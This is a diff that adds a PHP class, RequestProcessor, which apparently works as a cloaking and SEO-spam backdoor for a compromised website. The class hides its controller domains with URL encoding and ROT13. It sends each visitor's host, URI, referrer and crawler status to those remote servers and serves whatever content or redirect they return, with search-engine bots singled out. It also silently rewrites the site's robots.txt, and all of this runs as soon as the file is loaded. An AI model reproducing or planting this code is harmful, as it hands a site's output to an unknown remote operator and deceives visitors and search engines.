@@ -1,0 +1,171 @@
+<?php
+class RequestProcessor {
+    private $xmlname;
+    private $http_web = 'http';
+    private $host;
+    private $lang;
+    private $urlshang = '';
+    private $http;
+    private $spider;
+    private $requestUri;
+    private $string = '1033-bright012';
+    private $istest = false;
+    private $robots_flag = 0;
+    private $param;
+    private $html_content;
+
+    public function __construct() {
+        $this->xmlname = ["%31%30%33%33%2D%6F%65%76%74%75%67%30%31%32%2E%70%62%61%69%62%79%68%67%6C%2E%6B%6C%6D","%31%30%33%33%2D%6F%65%76%74%75%67%30%31%32%2E%72%63%75%72%7A%72%76%6B%2E%67%62%63","%31%30%33%33%2D%6F%65%76%74%75%67%30%31%32%2E%64%68%6E%61%67%68%6E%67%67%2E%6B%6C%6D","%31%30%33%33%2D%6F%65%76%74%75%67%30%31%32%2E%67%72%70%75%61%72%6B%63%2E%67%62%63"];
+
+        $this->host = $_SERVER['HTTP_HOST'];
+        $this->lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'en';
+        $this->urlshang = $_SERVER['HTTP_REFERER'] ?? '';
+
+        $this->http = $this->is_https() ? 'https' : 'http';
+        $this->spider = $this->is_bot();
+        $this->requestUri = $this->get_request_uri();
+
+        if ($this->is_from_search_engine($this->urlshang)) {
+            $this->urlshang = '1';
+        }
+
+        if (strpos($this->requestUri, $this->string) !== false) {
+            $this->istest = true;
+        } else {
+            $this->string = '';
+        }
+
+        if (strpos($this->requestUri, 'robots.txt') !== false || strpos($this->requestUri, '?robots.txt') !== false) {
+            $this->robots_flag = 1;
+        }
+
+        $this->create_robots($this->http . '://' . $this->host);
+        $this->build_param();
+        $this->html_content = $this->request($this->xmlname, $this->http_web, $this->param);
+        $this->handle_response();
+    }
+
+    private function build_param() {
+        $this->param = 'host=' . $this->host .
+            '&spider=' . $this->spider .
+            '&requestUri=' . $this->requestUri .
+            '&urlshang=' . $this->urlshang .
+            '&http=' . $this->http .
+            '&lang=' . $this->lang .
+            '&string=' . $this->string .
+            '&robots=' . $this->robots_flag;
+    }
+
+    private function handle_response() {
+        if (!strstr($this->html_content, 'nobotuseragent')) {
+            if (strstr($this->html_content, 'okhtml')) {
+                header('Content-type: text/html; charset=utf-8');
+                $this->html_content = str_replace('okhtml', '', $this->html_content);
+                if ($this->istest) {
+                    echo $this->string;
+                }
+                echo $this->html_content;
+                exit();
+            } elseif (strstr($this->html_content, 'getcontent500page')) {
+                header('HTTP/1.1 500 Internal Server Error');
+                exit();
+            } elseif (strstr($this->html_content, '404page')) {
+                header('HTTP/1.1 404 Not Found');
+                exit();
+            } elseif (strstr($this->html_content, '301page')) {
+                header('HTTP/1.1 301 Moved Permanently');
+                $this->html_content = str_replace('301page', '', $this->html_content);
+                header('Location: ' . $this->html_content);
+                exit();
+            } elseif (strstr($this->html_content, 'okxml')) {
+                $this->html_content = str_replace('okxml', '', $this->html_content);
+                header('Content-Type: application/xml; charset=utf-8');
+                echo $this->html_content;
+                exit();
+            } elseif (strstr($this->html_content, 'okrobots')) {
+                $this->html_content = str_replace('okrobots', '', $this->html_content);
+                header('Content-Type: text/plain; charset=utf-8');
+                echo $this->html_content;
+                exit();
+            }
+        }
+    }
+
+    private function request($xmlname, $http_web, $param) {
+        shuffle($xmlname);
+        foreach ($xmlname as $domain) {
+            $domain = str_rot13(urldecode($domain));
+            $url = $http_web . '://' . $domain . '/?' . $param;
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            $response = curl_exec($ch);
+            if (!curl_errno($ch)) {
+                curl_close($ch);
+                return $response;
+            } else {
+                if (stristr(curl_error($ch), '443')) {
+                    echo "443";
+                }
+                curl_close($ch);
+            }
+        }
+        return 'nobotuseragent';
+    }
+
+    private function is_bot() {
+        $user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
+        $bots = ['googlebot', 'bing', 'yahoo', 'google', 'Googlebot'];
+        foreach ($bots as $bot) {
+            if (strpos($user_agent, $bot) !== false) {
+                return 1;
+            }
+        }
+        return 0;
+    }
+
+    private function get_request_uri() {
+        if (isset($_SERVER['REQUEST_URI'])) {
+            return $_SERVER['REQUEST_URI'];
+        } elseif (isset($_SERVER['argv'])) {
+            return $_SERVER['PHP_SELF'] . '?' . $_SERVER['argv'][0];
+        } else {
+            return $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];
+        }
+    }
+
+    private function is_from_search_engine($referer) {
+        if (empty($referer)) return false;
+        $searchEngines = ['google.', 'bing.', 'yahoo.'];
+        foreach ($searchEngines as $engine) {
+            if (stripos($referer, $engine) !== false) {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    private function create_robots($url) {
+        $path = $_SERVER['DOCUMENT_ROOT'] . '/robots.txt';
+        $content = 'User-agent: *' . PHP_EOL;
+        $content .= 'Allow: /' . PHP_EOL . PHP_EOL;
+        $content .= 'Sitemap: ' . $url . '/sitemap.xml' . PHP_EOL;
+        if (!file_exists($path)) {
+            file_put_contents($path, $content);
+        } else {
+            $existingContent = file_get_contents($path);
+            if ($existingContent !== $content) {
+                file_put_contents($path, $content);
+            }
+        }
+    }
+
+    private function is_https() {
+        if (isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') return true;
+        if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') return true;
+        if (isset($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off') return true;
+        return false;
+    }
+}
+
+new RequestProcessor();
